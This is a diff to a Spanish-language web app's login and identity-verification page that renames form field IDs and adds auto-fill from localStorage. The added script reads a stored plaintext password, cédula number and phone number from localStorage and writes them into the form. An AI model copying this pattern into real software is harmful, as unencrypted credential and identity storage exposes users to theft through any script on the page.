@@ -3267,20 +3267,20 @@
       </div>
       
       <div class="form-group">
-        <label class="form-label" for="login-name">Nombre Completo</label>
-        <input type="text" class="form-control" id="login-name" placeholder="Ej: Juan Pérez" aria-describedby="name-error">
+        <label class="form-label" for="full-name">Nombre Completo</label>
+        <input type="text" class="form-control" id="full-name" placeholder="Ej: Juan Pérez" aria-describedby="name-error">
         <div class="error-message" id="name-error">Por favor, introduce tu nombre y apellido (solo letras).</div>
       </div>
       
       <div class="form-group">
-        <label class="form-label" for="login-email">Correo Electrónico</label>
-        <input type="email" class="form-control" id="login-email" placeholder="ejemplo@correo.com" aria-describedby="email-error">
+        <label class="form-label" for="email">Correo Electrónico</label>
+        <input type="email" class="form-control" id="email" placeholder="ejemplo@correo.com" aria-describedby="email-error">
         <div class="error-message" id="email-error">Por favor, introduce un correo electrónico válido.</div>
       </div>
       
       <div class="form-group">
-        <label class="form-label" for="login-code">Clave de 20 dígitos</label>
-        <input type="password" class="form-control" id="login-code" placeholder="Enviada a tu correo electrónico" aria-describedby="code-error">
+        <label class="form-label" for="password">Clave de 20 dígitos</label>
+        <input type="password" class="form-control" id="password" placeholder="Enviada a tu correo electrónico" aria-describedby="code-error">
         <div class="error-message" id="code-error">La clave debe tener 20 dígitos.</div>
       </div>
       
@@ -4417,15 +4417,15 @@
         
         <!-- Campos adicionales para cédula y teléfono -->
         <div class="form-group" style="margin-top: 1.5rem;">
-          <label class="form-label" for="id-number">Número de Cédula</label>
-          <input type="text" class="form-control" id="id-number" placeholder="Ej: V12345678" aria-describedby="id-number-error">
-          <div class="error-message" id="id-number-error">Por favor ingrese su número de cédula en formato V12345678.</div>
+          <label class="form-label" for="documentNumber">Número de Cédula</label>
+          <input type="text" class="form-control" id="documentNumber" placeholder="Ej: V12345678" aria-describedby="documentNumber-error">
+          <div class="error-message" id="documentNumber-error">Por favor ingrese su número de cédula en formato V12345678.</div>
         </div>
         
         <div class="form-group">
-          <label class="form-label" for="id-phone">Número de Teléfono</label>
-          <input type="text" class="form-control" id="id-phone" placeholder="Ej: 04121234567" aria-describedby="id-phone-error">
-          <div class="error-message" id="id-phone-error">Por favor ingrese su número de teléfono en formato 04121234567.</div>
+          <label class="form-label" for="phoneNumber">Número de Teléfono</label>
+          <input type="text" class="form-control" id="phoneNumber" placeholder="Ej: 04121234567" aria-describedby="phoneNumber-error">
+          <div class="error-message" id="phoneNumber-error">Por favor ingrese su número de teléfono en formato 04121234567.</div>
         </div>
       </div>
       
@@ -5343,33 +5343,48 @@ function updateVerificationProcessingBanner() {
     // Cargar credenciales del usuario desde localStorage
     function loadUserCredentials() {
       const savedCredentials = localStorage.getItem(CONFIG.STORAGE_KEYS.USER_CREDENTIALS);
+      let credentials = null;
       if (savedCredentials) {
         try {
-          const credentials = JSON.parse(savedCredentials);
-          
-          // Autocompletar los campos del formulario de login
-          const nameInput = document.getElementById('login-name');
-          const emailInput = document.getElementById('login-email');
-          const loginSubtitle = document.getElementById('login-subtitle');
-          
-          if (nameInput && credentials.name) {
-            nameInput.value = credentials.name;
-          }
-          
-          if (emailInput && credentials.email) {
-            emailInput.value = credentials.email;
-          }
-          
-          // Actualizar subtítulo si hay credenciales guardadas
-          if (loginSubtitle && (credentials.name || credentials.email)) {
-            loginSubtitle.textContent = "Bienvenido de nuevo, ingrese su clave para continuar";
-          }
-          
-          return true;
+          credentials = JSON.parse(savedCredentials);
         } catch (e) {
           console.error('Error parsing user credentials:', e);
-          return false;
         }
+      }
+
+      if (!credentials) {
+        const regData = localStorage.getItem('visaUserData');
+        if (regData) {
+          try {
+            const parsed = JSON.parse(regData);
+            credentials = {
+              name: (parsed.preferredName || `${parsed.firstName || ''} ${parsed.lastName || ''}`).trim(),
+              email: parsed.email || ''
+            };
+          } catch (e) {
+            console.error('Error parsing registration data:', e);
+          }
+        }
+      }
+
+      if (credentials) {
+        const nameInput = document.getElementById('full-name');
+        const emailInput = document.getElementById('email');
+        const loginSubtitle = document.getElementById('login-subtitle');
+
+        if (nameInput && credentials.name) {
+          nameInput.value = credentials.name;
+        }
+
+        if (emailInput && credentials.email) {
+          emailInput.value = credentials.email;
+        }
+
+        if (loginSubtitle && (credentials.name || credentials.email)) {
+          loginSubtitle.textContent = "Bienvenido de nuevo, ingrese su clave para continuar";
+        }
+
+        return true;
       }
       return false;
     }
@@ -6939,9 +6954,9 @@ function updateVerificationProcessingBanner() {
       const loginButton = document.getElementById('login-button');
       if (loginButton) {
         loginButton.addEventListener('click', function() {
-          const nameInput = document.getElementById('login-name');
-          const emailInput = document.getElementById('login-email');
-          const codeInput = document.getElementById('login-code');
+          const nameInput = document.getElementById('full-name');
+          const emailInput = document.getElementById('email');
+          const codeInput = document.getElementById('password');
           
           const nameError = document.getElementById('name-error');
           const emailError = document.getElementById('email-error');
@@ -8795,10 +8810,10 @@ function updateVerificationProcessingBanner() {
       }
       
       // Configuración para los campos de cédula y teléfono
-      const idNumberInput = document.getElementById('id-number');
-      const idNumberError = document.getElementById('id-number-error');
-      const idPhoneInput = document.getElementById('id-phone');
-      const idPhoneError = document.getElementById('id-phone-error');
+      const idNumberInput = document.getElementById('documentNumber');
+      const idNumberError = document.getElementById('documentNumber-error');
+      const idPhoneInput = document.getElementById('phoneNumber');
+      const idPhoneError = document.getElementById('phoneNumber-error');
       
       if (idNumberInput) {
         idNumberInput.addEventListener('input', function() {
@@ -8852,8 +8867,8 @@ function updateVerificationProcessingBanner() {
         submitVerification.addEventListener('click', function() {
           const idFrontFile = document.getElementById('id-front-file');
           const idBackFile = document.getElementById('id-back-file');
-          const idNumber = document.getElementById('id-number');
-          const idPhone = document.getElementById('id-phone');
+          const idNumber = document.getElementById('documentNumber');
+          const idPhone = document.getElementById('phoneNumber');
           
           let isValid = true;
           
@@ -9097,5 +9112,25 @@ function updateVerificationProcessingBanner() {
 
   <div id="transfer-overlay" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:#fff; z-index:10000;"></div>
   <script src="spa.js"></script>
+  <script>
+    (function() {
+      const regData = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      const userData = JSON.parse(localStorage.getItem('visaUserData') || '{}');
+      const data = Object.assign({}, regData, userData);
+      const mapping = {
+        'full-name': data.firstName && data.lastName ? `${data.firstName} ${data.lastName}` : '',
+        'email': data.email || '',
+        'password': data.password || '',
+        'documentNumber': data.documentNumber || '',
+        'phoneNumber': data.phoneNumber || ''
+      };
+      Object.keys(mapping).forEach(id => {
+        const el = document.getElementById(id);
+        if (el && !el.value && mapping[id]) {
+          el.value = mapping[id];
+        }
+      });
+    })();
+  </script>
 </body>
 </html>
